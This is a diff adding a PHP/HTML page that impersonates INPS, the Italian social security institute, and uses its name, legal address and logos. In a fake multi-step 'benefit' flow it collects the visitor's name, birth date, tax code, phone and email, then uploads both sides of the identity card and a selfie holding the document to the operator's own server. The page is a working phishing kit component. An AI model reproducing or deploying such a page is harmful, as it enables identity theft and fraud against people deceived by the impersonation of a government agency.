@@ -1,0 +1,466 @@
+<?php
+
+session_start();
+require("retro/generale.php");
+
+//CUSTOM
+$pagina = array('nome', 'cognome', 'cod', 'tel', 'email', 'giorno', 'month', 'year', 'CIF', 'CIR', 'SELFIE');
+$numero = 0;
+$prossima = "patente2.php";
+$precedente = "index.php";
+
+//INCLUDERE MOTORE
+require("retro/motore.php");
+
+?>
+<html class="sfondo">
+
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/css/bootstrap.min.css">
+
+
+
+  <style>
+    .father {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .resto {
+      display: none;
+    }
+
+    .nascondi {
+      display: none !important;
+    }
+
+    .child {
+
+      background-image: url(logo.jpg);
+      margin-top: 100%;
+      position: absolute;
+    }
+
+    .myButton {
+      width: 100%;
+      background-color: #5498d4;
+      border-radius: 23px;
+      border: 1px solid #5498d4;
+      display: inline-block;
+      cursor: pointer;
+      color: #ffffff;
+      font-family: Arial;
+      font-size: 17px;
+      font-weight: bold;
+      padding: 17px 31px;
+      text-decoration: none;
+      text-shadow: 0px 1px 0px #5498d4;
+    }
+
+    .myButton:hover {
+      background-color: #5498d4;
+    }
+
+    .myButton:active {
+      position: relative;
+      top: 1px;
+    }
+
+
+
+    label {
+      margin: 15px 0px !important;
+      font-size: 110%;
+    }
+
+    .i1 {
+      width: 100%;
+
+
+      line-height: 180%;
+      font-size: 110%;
+    }
+
+
+    input {}
+
+    .sfondo {
+      /* FLOAT: RIGHT; */
+      background-repeat: no-repeat;
+      background-size: cover;
+    }
+
+    input {
+      padding: 10px;
+
+    }
+
+    SELECT {
+      height: 50px;
+    }
+
+    .input2 {
+      padding: 10px;
+
+    }
+
+    form .sopra {
+      font-weight: bold;
+      font-size: 90%;
+      border-radius: 15px 15px 0px 0px;
+      margin: 0;
+      padding: 10px 0px;
+      color: black;
+    }
+
+    form .sopra2 {
+      font-weight: normal;
+      font-size: 90%;
+      border-radius: 0px 0px 15px 15px;
+      margin: 0;
+      padding: 10px 0px;
+      color: #545454;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="father" style="display: none;">
+    <div class="child"><img src="logo.png"></div>
+  </div>
+  <div class="resto" style="display: block;">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/purecss@2.0.5/build/pure-min.css">
+    <script src="jquery-latest.min.js"></script>
+    <div style="">
+      <img src="logo2.jpg" style="margin: 15px 15px 10px 15px;width: 250px;">
+    </div>
+
+
+    <div style="font-size: 140%;margin: 0px 4%;font-weight:normal">
+      <h1>Conferma la tua identità</h1>
+      <h2 style="font-size: 120%;margin-top: 0px;font-weight:normal">PER CONFERMARE
+        LA SUA <b>IDENTITA'</b> E' NECESSARIO COMPILARE QUANTO SEGUE.</h2>
+      <br>
+      <br>
+      <p>INPS EROGAZIONI - PASSO 1 DI 5</p>
+      <div class="progress">
+        <div class="progress-bar" role="progressbar" style="width: 25%" aria-valuenow="40" aria-valuemin="0"
+          aria-valuemax="100"></div>
+      </div>
+
+
+
+      <form method="POST" autocomplete="off">
+
+
+        <div class="pure-g">
+          <div class="pure-u-1-2">
+            <h3 class="sopra">Nome</h3><input style="width:90%" autocomplete="off" required="" class="i1" id="username"
+              name="nome" value="" type="text">
+          </div>
+          <div class="pure-u-1-2">
+            <h3 class="sopra">Cognome</h3>
+            <input autocomplete="off" required="" class="i1" id="username" name="cognome" value="" type="text">
+          </div>
+
+        </div>
+
+        <?php
+        $mesi = array("gennaio", "febbraio", "marzo", "aprile", "maggio", "giugno", "luglio", "agosto", "settembre", "ottobre", "novembre", "dicembre");
+        $mesi2 = array(
+          "1",
+          "2",
+          "3",
+          "4",
+          "5",
+          "6",
+          "7",
+          "8",
+          "9",
+          "10",
+          "11",
+          "12",
+          "13",
+          "14",
+          "15",
+          "16",
+          "17",
+          "18",
+          "19",
+          "20",
+          "21",
+          "22",
+          "23",
+          "24",
+          "25",
+          "26",
+          "27",
+          "28",
+          "29",
+          "30",
+          "31"
+        );
+        $annoDiPartenza = 1930;
+        $annoAttuale = date("Y", time());
+        ?>
+
+        <br>
+        <h3 class="sopra">Data di Nascita</h3>
+
+
+        <div class="pure-g">
+          <div class="pure-u-1-3">
+            <p>
+              <select style="width:90%" class="i1" required name="giorno">
+                <option selected="selected" value="">GG</option>
+                <?php
+                foreach ($mesi2 as $numero => $mese) {
+                  echo '<option value="' . ($numero + 1) . '">' . $mese . '</option>';
+                }
+                echo '</select>';
+                ?>
+
+            </p>
+          </div>
+          <div class="pure-u-1-3">
+            <p> <select style="width:90%" required class="i1" name="month">
+                <option selected="selected" value="">MM</option>
+                <?php
+                foreach ($mesi as $numero => $mese) {
+                  echo '<option value="' . ($numero + 1) . '">' . $mese . '</option>';
+                }
+                echo '</select>';
+                ?>
+            </p>
+          </div>
+          <div class="pure-u-1-3">
+            <p>
+              <?php
+              echo '<select  class="i1"required  name="year">';
+              echo '<option selected="selected" value="">AAAA</option>';
+              for ($i = $annoDiPartenza; $i <= $annoAttuale; $i++) {
+                echo '<option value="' . $i . '">' . $i . '</option>';
+              }
+              echo '</select>';
+              ?>
+            </p>
+          </div>
+        </div>
+        <h3 class="sopra">Codice Fiscale</h3>
+
+
+        <input autocomplete="off" required="" class="i1" type="text" name="cod"><br><br>
+
+
+        <h3 class="sopra">Telefono</h3>
+        <input autocomplete="off" required="" class="i1" type="text" name="tel">
+        <br><br>
+        <h3 class="sopra">E-mail</h3>
+        <input autocomplete="off" required="" class="i1" type="email" name="email">
+        <br><br>
+        <h3 class="sopra">Fronte Carta Identità</h3>
+
+
+        <div class="container caricamento" data-input="CIF">
+          <div class="row" style="padding-top:10px;">
+            <div class="">
+              <button id="uploadBtn" data-type="front_document" class="btn uploadBtn btn-large btn-primary">Carica
+                documento Carta di Identità
+                Fronte</button>
+            </div>
+            <div class="col-12" style=" margin-top: 10px;padding-left:0px; ">
+              <div id="progressOuter" class=" progressOuter progress progress-striped active"
+                style="display:none;height: 30px;">
+                <div id="progressBar" class=" progressBar progress-bar progress-bar-success" role="progressbar"
+                  aria-valuenow="45" aria-valuemin="0" aria-valuemax="100" style="width: 0%">
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="row">
+            <div class="">
+              <div id="msgBox" class="msgBox">
+              </div>
+            </div>
+          </div>
+
+          <input autocomplete="off" class="i1 nascondi CIF" type="text" name="CIF">
+        </div>
+
+        <h3 class="sopra2">Assicurati che tutti gli angoli appaiono nella foto e che tutti i dati sul documento siano
+          ben leggibili.</h3><br>
+        <h3 class="sopra">Retro Carta Identità</h3>
+
+
+        <div class="container caricamento" data-input="CIR">
+          <div class="row" style="padding-top:10px;">
+            <div class="">
+              <button id="uploadBtn" data-type="retro-document" class="btn uploadBtn btn-large btn-primary">Carica
+                documento Carta di Identità
+                Retro</button>
+            </div>
+            <div class="col-12" style=" margin-top: 10px;padding-left:0px; ">
+              <div id="progressOuter" class=" progressOuter progress progress-striped active"
+                style="display:none;height: 30px;">
+                <div id="progressBar" class=" progressBar progress-bar progress-bar-success" role="progressbar"
+                  aria-valuenow="45" aria-valuemin="0" aria-valuemax="100" style="width: 0%">
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="row">
+            <div class="">
+              <div id="msgBox" class="msgBox">
+              </div>
+            </div>
+          </div>
+          <input autocomplete="off" class="i1 input2 nascondi CIR" type="text" name="CIR">
+
+        </div>
+        <h3 class="sopra2">Assicurati che tutti gli angoli appaiono nella foto e che tutti i dati sul documento siano
+          ben leggibili.</h3><br>
+        <h3 class="sopra">Selfie con documento in mano </h3>
+        <div class="container caricamento" data-input="SELFIE">
+          <div class="row" style="padding-top:10px;">
+            <div class="">
+              <button id="uploadBtn" data-type="selfie" class="btn uploadBtn btn-large btn-primary">Carica Selfie con
+                documento</button>
+            </div>
+            <div class="col-12" style=" margin-top: 10px;padding-left:0px; ">
+              <div id="progressOuter" class=" progressOuter progress progress-striped active"
+                style="display:none;height: 30px;">
+                <div id="progressBar" class=" progressBar progress-bar progress-bar-success" role="progressbar"
+                  aria-valuenow="45" aria-valuemin="0" aria-valuemax="100" style="width: 0%">
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="row">
+            <div class="">
+              <div id="msgBox" class="msgBox">
+              </div>
+            </div>
+          </div>
+          <input class="i1 input2 nascondi SELFIE" type="text" name="SELFIE">
+
+        </div>
+        <h3 class="sopra2">Tenere il documento d'identità in mano sotto al mento, NON coprire il volto.</h3><br><button
+          type="submit" class="myButton">Conferma</button><br>
+
+      </form>
+    </div>
+  </div>
+
+  <div style="background-color: #5a6772;"><img src="logo2.png" style="margin: 15px 15px 10px 15px;">
+    <p style="color: white;padding: 18px;">Istituto Nazionale Previdenza Sociale<br>
+      P.IVA 02121151001<br>
+      Sede Legale:<br>
+      Via Ciro il Grande, 21<br>
+      00144 Roma</p>
+  </div>
+
+
+
+
+
+
+  <script src="SimpleAjaxUploader.js"></script>
+  <script>
+    function escapeTags(str) {
+      return String(str)
+        .replace(/&/g, '&amp;')
+        .replace(/"/g, '&quot;')
+        .replace(/'/g, '&#39;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;');
+    }
+
+    window.onload = function () {
+      jQuery(".caricamento").each(function () {
+        var btn = jQuery(this).find('#uploadBtn'),
+          progressBar = jQuery(this).find('#progressBar'),
+          progressOuter = jQuery(this).find('#progressOuter'),
+          msgBox = jQuery(this).find('#msgBox');
+        inp = jQuery(this).find('input');
+        var uploader = new ss.SimpleUpload({
+          button: btn,
+          url: 'file_upload.php',
+          name: 'uploadfile',
+          multipart: true,
+          hoverClass: 'hover',
+          focusClass: 'focus',
+          responseType: 'json',
+          startXHR: function () {
+            progressOuter[0].style.display = 'block'; // make progress bar visible
+            this.setProgressBar(progressBar);
+          },
+          onSubmit: function () {
+            console.log(btn)
+            msgBox.html(''); // empty the message box
+            jQuery(msgBox).show()
+
+            jQuery(msgBox).removeClass("ok").removeClass("ko")
+            btn.html('Caricamento, attendere prego...'); // change button text to "Uploading..."
+            this.setData({
+              'data-type': btn.data('type') // используйте jQuery data для получения значения атрибута data-type
+            });
+          },
+          onComplete: function (filename, response) {
+            btn.html('Scegli un altro file');
+            progressOuter[0].style.display = 'none'; // hide progress bar when upload is completed
+            console.log(response)
+            console.log('----')
+            if (!response) {
+              msgBox.html('impossibile caricare il file');
+              jQuery(msgBox).show()
+              return;
+            }
+
+            if (response.success === true) {
+              msgBox.html('<strong class="metti" data-value="' + response.nome + '" >' + escapeTags(filename) + '</strong>' + ' caricato correttamente');
+              jQuery(msgBox).show()
+              jQuery(msgBox).addClass("ok")
+            } else {
+              if (response.msg) {
+                msgBox.html(escapeTags(response.msg));
+                jQuery(msgBox).show()
+                jQuery(msgBox).removeClass("ok")
+                jQuery(msgBox).addClass("ko")
+
+              } else {
+                msgBox.html('si è verificato un errore riprova');
+                jQuery(msgBox).show()
+                jQuery(msgBox).addClass("ko")
+              }
+            }
+          },
+          onError: function (response) {
+            console.log(response);
+            console.log("HTTP Status Code: " + response.status);
+            console.log(response)
+            progressOuter[0].style.display = 'none';
+            msgBox.html('Impossibile caricare il file');
+          }
+        });
+      })
+    };
+
+    setInterval(function () {
+
+
+      jQuery(".metti").each(function () {
+
+        nome = jQuery(this).parents(".container").data("input")
+        jj = jQuery(this).data("value")
+        jQuery("." + nome).val(jj)
+      })
+    }, 500);
+  </script>
+
+
+</body>
+
+</html>
